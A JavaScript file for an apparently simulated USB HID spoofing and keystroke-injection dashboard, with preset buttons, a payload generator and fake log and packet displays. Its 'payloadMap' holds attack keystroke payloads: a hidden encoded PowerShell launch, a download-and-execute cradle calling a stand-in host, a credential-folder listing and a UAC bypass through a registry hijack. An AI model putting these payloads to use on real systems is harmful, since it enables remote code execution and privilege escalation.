const payloadMap = {
  'Admin Shell': `STRING "powershell -NoP -W Hidden -Exec Bypass -EncodedCommand ..."\nENTER`,
  'PowerShell': `STRING "powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1')\""\nENTER`,
  'Credential Harvest': `STRING "echo 'harvest' > /tmp/cred.txt"\nENTER\nSTRING "ls /Users/*/Library/Application Support"\nENTER`,
  'UAC Bypass': `STRING "cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"cmd.exe /c start powershell\" /f"\nENTER`
};

const aliasInput = document.getElementById('aliasInput');
const vendorInput = document.getElementById('vendorInput');
const productInput = document.getElementById('productInput');
const serialInput = document.getElementById('serialInput');
const payloadInput = document.getElementById('payloadInput');
const presetName = document.getElementById('presetName');
const packetCount = document.getElementById('packetCount');
const logList = document.getElementById('logList');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const generateBtn = document.getElementById('generateBtn');

const addLog = (message) => {
  const now = new Date();
  const time = now.toLocaleTimeString([], { hour12: false });
  const item = document.createElement('li');
  item.innerHTML = `<span class="time">${time}</span> <span>${message}</span>`;
  logList.prepend(item);

  while (logList.children.length > 6) {
    logList.removeChild(logList.lastChild);
  }
};

const updatePackets = () => {
  const current = Number(packetCount.textContent || 0);
  packetCount.textContent = String(current + 18);
};

document.querySelectorAll('.preset').forEach((button) => {
  button.addEventListener('click', () => {
    document.querySelectorAll('.preset').forEach((preset) => preset.classList.remove('selected'));
    button.classList.add('selected');
    presetName.textContent = button.dataset.preset;
    payloadInput.value = payloadMap[button.dataset.preset] || payloadInput.value;
    addLog(`Preset activated: ${button.dataset.preset}`);
  });
});

generateBtn.addEventListener('click', () => {
  const alias = aliasInput.value.trim() || 'Kali-USB-07';
  const vendor = vendorInput.value.trim() || '0x046D';
  const product = productInput.value.trim() || '0xC52B';
  const serial = serialInput.value.trim() || 'WHID-2048';

  payloadInput.value = `REM ${alias} / ${vendor}:${product} / ${serial}\nSTRING "SET HID_VENDOR=${vendor}"\nENTER\nSTRING "SET HID_PRODUCT=${product}"\nENTER\nSTRING "SET HID_SERIAL=${serial}"\nENTER\nSTRING "echo 'device ready'"\nENTER`;

  addLog('Generated payload for target profile');
  updatePackets();
});

startBtn.addEventListener('click', () => {
  addLog('Spoof session initiated');
  addLog(`Descriptor loaded: ${aliasInput.value || 'Kali-USB-07'}`);
  updatePackets();
  updatePackets();
});

stopBtn.addEventListener('click', () => {
  addLog('Spoof session halted');
  updatePackets();
});

window.addEventListener('load', () => {
  addLog('System initialized');
  addLog('USB HID bus ready');
});
